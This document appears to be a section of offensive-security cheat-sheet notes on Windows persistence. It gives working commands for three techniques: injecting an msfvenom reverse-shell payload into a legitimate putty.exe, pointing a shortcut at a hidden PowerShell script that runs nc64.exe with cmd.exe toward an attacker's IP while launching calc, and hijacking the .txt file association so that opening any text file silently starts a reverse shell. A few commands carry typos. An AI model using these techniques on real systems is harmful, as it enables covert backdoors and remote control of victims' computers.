### Executable Files
- Legit binary can be replaced with reverse shell. [Msfvenom](../../Cheatsheet/Msfvenom.md) can inject payload into a legit binary.
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/reverse_reverse_tcp LHOST=localhost LPORT=<port> -b "\x00" -f exe -o putty_x.exe
```
### Shortcuts
- Changing shortcut target to our reverse shell
- Point it to a script:
```powershell
# backdoor.ps1
Start-Process -NoNewWindows "c:\tools\nc64.exe" "-e cmd.exe <IP> <PORT>"
C:\Windows\System32\calc.exe
```
- Shortcut target:
```powershell
powershell.exe -WindowStyle Hidden C:\Windows\System32\backdoor.ps1
```
### File Associations
- Registry stores key for every single file type under `HKLM\Software\Classes` which contains the ProgID.
- `ProgID` is the identified for the program that opens that file.
- Example:
```powershell
HKLM\Software\Classes\.txt -> txtfile (ProgID)
```
- `HKLM\Software\Classes` also has entry for the `txtfile` ProgID.
- Default command to run for the files is stored under `HKLM\Software\Classess\<progID>\shell\open\command`
```powershell
HKLM\Software\Classes\txtfile\shell\open\command -> %SystemRoot%\system32\notepad.exe %1
# %1 is the filename
```
- We can change this key to 
```powershell
HKLM\Software\Classes\txtfile\shell\open\command -> powershell.exe -WindowStyle Hidden C:\Windows\System32\backdoor2.ps1
```
- backdoor2.ps1
```powershell
Start-Process -NoNewWindows "c:\tools\nc64.exe" "-e cmd.exe <IP> <PORT>"
C:\Windows\System32\Notepad.exe $args[0]
```
- Opening a txt file will now trigger the reverse shell